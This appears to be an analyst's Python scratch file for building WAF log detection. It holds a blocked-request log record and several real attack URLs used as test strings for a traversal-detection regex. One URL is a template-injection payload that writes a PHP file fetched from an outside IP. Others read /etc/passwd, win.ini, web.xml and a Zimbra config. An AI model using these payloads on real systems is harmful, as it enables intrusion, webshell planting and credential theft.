#!/usr/local/bin/python3
# -*- coding=utf-8 -*-
# 作者：呼姆呼姆
# 邮箱：wuzhiping26@gmail.com
from pprint import pprint
import os
import re

diccc = {
    "protocol": "https",
    "timestamp": "1712817302",
    "country": "CN",
    "req_risk_level": "high",
    "req_policy_id_list": "\"9@time-1676531110\"",
    "req_action": "deny",
    "query_string": "",
    "session": "",
    "user_agent": "Mozilla/5.0 (Linux; Android 12; LIO-AL00 Build/HUAWEILIO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 XWEB/1160117 MMWEBSDK/20240301 MMWEBID/1305 MicroMessenger/8.0.48.2580(0x2800303F) WeChat/arm64 Weixin NetType/4G Language/zh_CN ABI/arm64",
    "rsp_start_time": "null",
    "dest_port": "443",
    "req_proxy_name": "chaitin-safeline",
    "socket_ip": "114.85.234.13",
    "@version": "1",
    "req_start_time": "1712817302392",
    "req_end_time": "1712817302392",
    "province": "上海",
    "req_payload": "",
    "req_decode_path": "",
    "timestamp_human": "2024-04-11 14:35:02",
    "module": "",
    "reason": "禁用php",
    "priority": "30",
    "site_uuid": "2",
    "req_policy_group_id": "0",
    "urlpath": "/shell.php",
    "@timestamp": "2024-04-11T14:35:02.000Z",
    "type": "ChaiTin_OA",
    "req_detector_name": "chaitin-safeline",
    "referer": "",
    "rsp_end_time": "null",
    "host": "oa.shchinafortune.com",
    "event_id": "c697d22639994335b4649531d9d15f82",
    "attack_type": "unauthorized_access",
    "src_ip": "114.85.234.13",
    "action": "deny",
    "resp_reason_phrase": "",
    "dest_ip": "10.168.224.10",
    "node": "chaitin-safeline",
    "req_block_reason": "web",
    "risk_level": "high",
    "req_rule_module": "",
    "location": "",
    "cookie": "route=8794b7ee680593e09ee58cf83b6576cc; JSESSIONID=aaaVJ2PZ4-1rWcvA78V5y",
    "req_location": "",
    "proxy_name": "chaitin-safeline",
    "site_url": "https://oa.shchinafortune.com",
    "src_port": "49142",
    "req_rule_id": "/9@time-1676531110",
    "req_attack_type": "unauthorized_access",
    "method": "GET",
    "detector_ip_source": "Socket",
    "payload": "",
    "rule_id": "/9@time-1676531110",
    "decode_path": "",
    "body": "",
    "scheme": "https"
}

# pprint(diccc.keys())
#
# MySQL_USER = os.getenv('MySQL_USER')
# MySQL_PWD = os.getenv('MySQL_PWD')
# print(MySQL_USER)
# print(MySQL_PWD)
#
# xx = [1, 2, 2, 3]
# len(xx)

s1 = "/ncchr/pm/fb/attachment/uploadChunk?chunk=1\\u0026chunks=1\\u0026fileGuid=/../../../nccloud/"
s3 = "/ncchr/pm/fb/attachment/uploadChunk?chunk=1\\u0026chunks=1\\u0026fileGuid=/../../../nccloud/"
s2 = "/ncchr/pm/fb/attachment/uploadChunk?chunk=1\\u0026chunks=1\\u0026fileGuid=/nccloud/"
l1 = [s1, s2, s3]
xx = [1 for i in l1 if re.search(r'(\.\./){2}', i)]
# result = re.search(r'(\.\./){2}', s1)
# result2 = re.search(r'(\.\./){2}', s2)
# print(result)
# print(result2)
# print(xx)
# from IPy import IP
# n = IP('180.0.0.0/8')
# n1 = '180.1.1.1'
# n2 = '110.1.1.1'
# print(n1 in n)
# print(n2 in n)
result2 = '//?tag\\u0026tagstpl=news.html\\u0026tag={pbohome/Indexot:if((get/*-*/(/**/t))/**/(get/*-*/(/**/t1),get/*-*/(/**/t2)(get/*-*/(/**/t3))))}ok{/pbohome/Indexot:if}\\u0026t=file_put_contents\\u0026t1=./data/connn.php\\u0026t2=file_get_contents\\u0026t3=https://18.166.48.92:3745/2.txt'
result3 = '/tiki-jsplugin.php?plugin=x\\u0026language=/windows/win.ini'
result4 = '/fetchBody?id=1/etc/passwd'
result5 = '/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml'
result6 = '/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450\\u0026skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml\\u0000'
result7 = '/portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login\\u0026filename=..\\\\..\\\\..\\\\webapps\\\\nc_web\\\\2ffwsNs3rVPzwG34etjBSzTjRV9.jsp\\u0000'
result8 = '/reports/rwservlet?report=test.rdf\\u0026desformat=html\\u0026destype=cache\\u0026JOBTYPE=rwurl\\u0026URLPARAMETER=file:///'
# res2 = re.search(r'(\.\./){2}|win\.ini|web\.xml|etc/passwd|http(s)?:|(\\\\\.\.){2}|file:', result2)
# res3 = re.search(r'(\.\./){2}|win\.ini|web\.xml|etc/passwd|http(s)?:|(\\\\\.\.){2}|file:', result3)
# res4 = re.search(r'(\.\./){2}|win\.ini|web\.xml|etc/passwd|http(s)?:|(\\\\\.\.){2}|file:', result4)
# res5 = re.search(r'(\.\./){2}|win\.ini|web\.xml|etc/passwd|http(s)?:|(\\\\\.\.){2}|file:', result5)
# res6 = re.search(r'(\.\./){2}|win\.ini|web\.xml|etc/passwd|http(s)?:|(\\\\\.\.){2}|file:', result6)
# res7 = re.search(r'(\.\./){2}|win\.ini|web\.xml|etc/passwd|http(s)?:|(\\\\\.\.){2}|file:', result7)
# res8 = re.search(r'(\.\./){2}|win\.ini|web\.xml|etc/passwd|http(s)?:|(\\\\\.\.){2}|file:', result8)
# temp = [i for i in result2 if re.search(r'(\.\./){2}|win\.ini|web\.xml|etc/passwd|http(s)?:', i)]
# print(res2)
# print(res3)
# print(res4)
# print(res5)
# print(res6)
# print(res7)
# print(res8)
#
# from functools import wraps
#
#
# def a_new_decorator(a_func):
#     @wraps(a_func)
#     def wrapTheFunction():
#         print("I am doing some boring work before executing a_func()")
#         a_func()
#         print("I am doing some boring work after executing a_func()")
#
#     return wrapTheFunction
#
#
# @a_new_decorator
# def a_function_requiring_decoration():
#     """Hey yo! Decorate me!"""
#     print("I am the function which needs some decoration to "
#           "remove my foul smell")
#
# a_function_requiring_decoration()
# print(a_function_requiring_decoration.__name__)
# # Output: a_function_requiring_decoration
#
# ss = [{'key': {'socket_ip': '27.20.153.33'}, 'doc_count': 231}, {'key': {'socket_ip': '31.220.1.83'}, 'doc_count': 19}, {'key': {'socket_ip': '39.165.155.42'}, 'doc_count': 103}, {'key': {'socket_ip': '42.240.132.51'}, 'doc_count': 58}, {'key': {'socket_ip': '43.129.213.100'}, 'doc_count': 41}, {'key': {'socket_ip': '43.155.130.43'}, 'doc_count': 15}, {'key': {'socket_ip': '45.119.212.196'}, 'doc_count': 45}, {'key': {'socket_ip': '45.128.232.107'}, 'doc_count': 12}, {'key': {'socket_ip': '47.92.65.140'}, 'doc_count': 11}, {'key': {'socket_ip': '47.122.64.1'}, 'doc_count': 110}, {'key': {'socket_ip': '50.19.75.47'}, 'doc_count': 12}, {'key': {'socket_ip': '52.81.208.25'}, 'doc_count': 16}, {'key': {'socket_ip': '52.81.236.145'}, 'doc_count': 13}]
# print(len(ss))


dict1 = {'a': 10, 'b': 8}
dict2 = {'d': 6, 'c': 4}
dict1.update(dict2)
print(dict1)

aa = {'52.80.60.159': ['scanner'],
      '52.80.71.82': ['scanner'],
      '52.80.96.170': ['scanner'],
      '52.81.203.9': ['scanner'],
      '52.81.236.145': ['scanner']}
for i in aa.keys():
    print(i)

ss = {
    "hits": {
        "hits": [
            {
                "_source": {
                    "blocked_ip": "192.168.1.4"
                }
            },
            {
                "_source": {
                    "blocked_ip": "192.168.1.5"
                }
            },
            {
                "_source": {
                    "blocked_ip": "192.168.1.6"
                }
            }
        ]
    }
}
hits = ss['hits']['hits']

xx = [i['_source']['blocked_ip'] for i in hits]
print(xx)
from datetime import datetime, timedelta

a = "2024-05-28 00:00:00"

a1 = datetime.strptime(a, '%Y-%m-%d %H:%M:%S')
ex = (a1 + timedelta(days=30)).strftime('%Y-%m-%d')
print(ex)

ct = datetime.now()
st = (ct - timedelta(days=-1)).strftime('%Y-%m-%d %H:%M:%S')
print(st)
